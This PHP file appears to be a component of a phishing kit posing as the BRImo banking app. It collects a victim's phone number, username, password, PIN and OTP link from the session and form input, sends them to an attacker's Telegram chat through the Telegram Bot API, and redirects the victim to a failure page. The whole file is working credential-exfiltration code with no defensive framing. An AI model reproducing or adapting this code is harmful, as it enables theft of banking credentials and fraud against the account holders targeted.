<?php
include "../telegram.php";
session_start();

$nohp = $_SESSION['nohp'];
$username = $_SESSION['username'];
$password = $_SESSION['password'];
$pin = $_SESSION['pin'];
$link = $_POST['link'];

$_SESSION['pin'] = $pin;

$message = "
( BRImo | OTP | ".$nohp." )

- No HP : ".$nohp."
- Username : ".$username."
- Password : ".$password."
- PIN : ".$pin."
- Link OTP : ".$link."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../fail.php');
?>
